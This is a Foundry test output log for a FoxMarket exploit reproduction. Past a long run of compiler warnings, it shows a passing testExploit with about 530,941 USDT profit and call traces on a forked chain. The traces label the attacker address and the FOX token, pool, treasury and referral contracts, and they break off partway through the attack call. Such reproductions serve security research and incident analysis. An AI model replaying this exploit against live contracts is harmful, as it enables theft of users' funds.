@@ -1,0 +1,797 @@
+Warning: Found unknown `eth_rpc_retries` config for profile `default` defined in foundry.toml.
+Compiling 23 files with Solc 0.8.35
+Solc 0.8.35 finished in 454.31ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+   --> interface.sol:300:19:
+    |
+300 |     event Failure(uint256 error, uint256 info, uint256 detail);
+    |                   ^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> interface.sol:1302:19:
+     |
+1302 |     event Failure(uint256 error, uint256 info, uint256 detail);
+     |                   ^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> interface.sol:1450:19:
+     |
+1450 |     event Failure(uint256 error, uint256 info, uint256 detail);
+     |                   ^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> interface.sol:3545:19:
+     |
+3545 |     event Failure(uint256 error, uint256 info, uint256 detail);
+     |                   ^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> interface.sol:3842:19:
+     |
+3842 |     event Failure(uint256 error, uint256 info, uint256 detail);
+     |                   ^^^^^^^^^^^^^
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1084:5:
+     |
+1084 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1896:5:
+     |
+1896 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2198:5:
+     |
+2198 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2967:5:
+     |
+2967 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:4462:5:
+     |
+4462 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/FoxMarket_exp.sol:ContractTest
+[PASS] testExploit() (gas: 2007846)
+Logs:
+  USDT profit: 530941.023056701789655683
+  Attacker Final USDT Balance: 531229.513635317959664599
+
+Traces:
+  [14568] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 116169048 [1.161e8])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Attacker EOA: [0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9], "Attacker EOA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(FOX: [0xdF81d50c6657487D19B66A1b5375E35A804Abb93], "FOX")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDT: [0x55d398326f99059fF775485246999027B3197955], "USDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], "FOX/USDT pair")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Pancake router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Pancake router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], "FoxLpBondsPool")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Treasury: [0x361d08ff43761E6a7E8Fcabe48048AE9010801cc], "Treasury")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Referral: [0xAa237ABB282Ae5476c1D22dE7e84fa7cbeEeDC9F], "Referral")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [2235146] ContractTest::testExploit()
+    ├─ [1033851] → new FoxMarketExploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [234873] → new StakerHelper@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 1173 bytes of code
+    │   └─ ← [Return] 3827 bytes of code
+    ├─ [0] VM::startPrank(0x12896036059ce563b713754f959353F4f4c1c55C)
+    │   └─ ← [Return]
+    ├─ [69687] Referral::setReferral(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x2bAE6c628fFfFB391CdB36d57cA5Cdf4e03540f7)
+    │   ├─ [64837] 0x6d4174E48e6a930d6acc2BE5139607b1eB08EE60::setReferral(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x2bAE6c628fFfFB391CdB36d57cA5Cdf4e03540f7) [delegatecall]
+    │   │   ├─ [2432] 0xF9b59f62E4fE55C5851E3b947236cb5958446F84::getBlockIdListCount() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000002c42
+    │   │   ├─ [27831] 0xF9b59f62E4fE55C5851E3b947236cb5958446F84::addBlockId()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 11330 → 11331
+    │   │   │   │   @ 0xc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f72249d: 0 → 0x0000000000000000000000000000000000000000000000000000000006ec9958
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit UserReferral(: 11330 [1.133e4], : FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], : 0x2bAE6c628fFfFB391CdB36d57cA5Cdf4e03540f7, : 1786836779 [1.786e9])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x0000000000000000000000002bae6c628ffffb391cdb36d57ca5cdf4e03540f7
+    │   │   └─ ← [Return]
+    │   └─ ← [Return]
+    ├─ [525] FoxMarketExploit::staker() [staticcall]
+    │   └─ ← [Return] StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [50091] Referral::setReferral(StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─ [49741] 0x6d4174E48e6a930d6acc2BE5139607b1eB08EE60::setReferral(StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   ├─ [432] 0xF9b59f62E4fE55C5851E3b947236cb5958446F84::getBlockIdListCount() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000002c43
+    │   │   ├─ [23031] 0xF9b59f62E4fE55C5851E3b947236cb5958446F84::addBlockId()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f72249e: 0 → 0x0000000000000000000000000000000000000000000000000000000006ec9958
+    │   │   │   │   @ 3: 11331 → 11332
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit UserReferral(: 11331 [1.133e4], : StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], : FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], : 1786836779 [1.786e9])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbc93b95fb13b8fd819fbf60078dbe0264f9841ed2d94ee86afa3a1c5655d236b: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   └─ ← [Return]
+    │   └─ ← [Return]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [2531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(USDT: [0x55d398326f99059fF775485246999027B3197955])
+    │   └─ ← [Return] [0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a], []
+    ├─ [0] VM::load(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: USDT: [0x55d398326f99059fF775485246999027B3197955], slot: 101865277652109193157934748849462594086263052630085157397691791389601577573226 [1.018e77])
+    ├─ [0] VM::load(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: USDT: [0x55d398326f99059fF775485246999027B3197955], fsig: 0x70a08231, keysHash: 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11, slot: 101865277652109193157934748849462594086263052630085157397691791389601577573226 [1.018e77])
+    ├─ [0] VM::load(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a, 0x000000000000000000000000000000000000000001743b34e18439b502000000)
+    │   └─ ← [Return]
+    ├─ [531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 450000000000000000000000000 [4.5e26]
+    ├─ [2531] USDT::balanceOf(Attacker EOA: [0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9]) [staticcall]
+    │   └─ ← [Return] 288490578616170008916 [2.884e20]
+    ├─ [0] VM::prank(Attacker EOA: [0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9])
+    │   └─ ← [Return]
+    ├─ [750054] FoxMarketExploit::attack()
+    │   ├─ [531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 450000000000000000000000000 [4.5e26]
+    │   ├─ [40047] FoxLpBondsPool::getSwapPrice(0) [staticcall]
+    │   │   ├─ [35194] 0x58E2A853BB14e46BefD3148bd4280370fEA4655A::getSwapPrice(0) [delegatecall]
+    │   │   │   ├─ [9651] Pancake router::getAmountsOut(1000000000000000000 [1e18], [0xdF81d50c6657487D19B66A1b5375E35A804Abb93, 0x55d398326f99059fF775485246999027B3197955]) [staticcall]
